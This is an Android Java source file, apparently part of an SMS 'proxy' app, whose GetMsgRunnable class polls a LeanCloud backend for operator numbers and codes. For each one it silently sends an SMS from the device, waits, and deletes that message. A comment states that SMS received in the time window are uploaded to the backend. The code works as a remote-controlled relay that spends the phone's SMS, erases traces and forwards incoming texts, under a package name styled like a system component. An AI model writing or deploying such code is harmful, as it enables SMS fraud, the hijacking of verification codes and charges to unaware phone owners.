package com.android.sms.proxy.service;

import android.content.Context;
import android.util.Log;

import com.android.sms.proxy.entity.CheckInfo;
import com.android.sms.proxy.entity.MessageEvent;
import com.android.sms.proxy.entity.PhoneInfo;
import com.avos.avoscloud.AVException;
import com.avos.avoscloud.AVObject;
import com.avos.avoscloud.AVQuery;
import com.oplay.nohelper.utils.Util_Sp;

import org.greenrobot.eventbus.EventBus;

import java.util.List;

/**
 * @author zyq 16-3-31
 */
public class GetMsgRunnable implements Runnable {

	private static final boolean DEBUG = false;
	private static final String TAG = "GetMsgRunnable";
	private Context mContext;

	//在规定时间内收到的短信会被上传到后台
	public static long sendSmsTime;
	public static CheckInfo currentCheckInfo;


	public GetMsgRunnable(Context context) {
		this.mContext = context;
	}

	@Override
	public void run() {
		try {
			if (DEBUG) {
				Log.d(TAG, "开始轮询了");
			}
			updateCheckInfo();
		} catch (Exception e) {
			if (DEBUG) {
				Log.d(TAG, e.fillInStackTrace().toString());
			}
		}
	}


	//获取最新的指令，
	private void updateCheckInfo() throws AVException {
		//若没有sim卡,毛用
		final boolean isSimExist = PhoneInfo.getInstance(mContext).isSIMexistOrAvaiable(mContext);
		if (!isSimExist) {
			return;
		}
		AVQuery<CheckInfo> query = AVObject.getQuery(CheckInfo.class);
		List<CheckInfo> list = query.find();
//		if(PhoneInfo.getInstance(mContext))

		if (list != null && list.size() > 0) {
			if (DEBUG) {
				Log.d(TAG, "查询的数量是：" + list.size());
			}
			for (int i = 0; i < list.size(); i++) {
				CheckInfo info = list.get(i);
				final boolean isDeleteOldData = Boolean.valueOf(info.getDeleteOldData());
				final String operators = info.getOperators();
				final String operatorCode = info.getOperatorCode();

				final String operatorInfo = operators + "_" + operatorCode;
				Log.d(TAG, "短信:" + operatorInfo);
				boolean isExist = Util_Sp.isOperatorInfoExist(mContext, operatorInfo);
				if (isExist) {
					if (!isDeleteOldData) {
						continue;
					}
				}
				//发送短信
				if (DEBUG) Log.d(TAG, "开始发送短信！！！！！！！！");
				sendSmsTime = System.currentTimeMillis();
				PhoneInfo.getInstance(mContext).sendSMS(operators, operatorCode);
				currentCheckInfo = info;
				String message = "\nsend " + info.getOperatorCode() + " to " + info.getOperators();
				MessageEvent messageEvent = new MessageEvent(message);
				EventBus.getDefault().post(messageEvent);
				try {
					if (DEBUG) {
						Log.d(TAG, "3５秒后重新查询！！！！");
					}

					Thread.currentThread().sleep(25000);
					PhoneInfo.getInstance(mContext).deleteSMS(mContext, currentCheckInfo.getOperatorCode());
					Thread.currentThread().sleep(25000);
				} catch (InterruptedException e) {
					if (DEBUG) {
						Log.e(TAG, e.toString());
					}
				}
			}
		}
	}


}
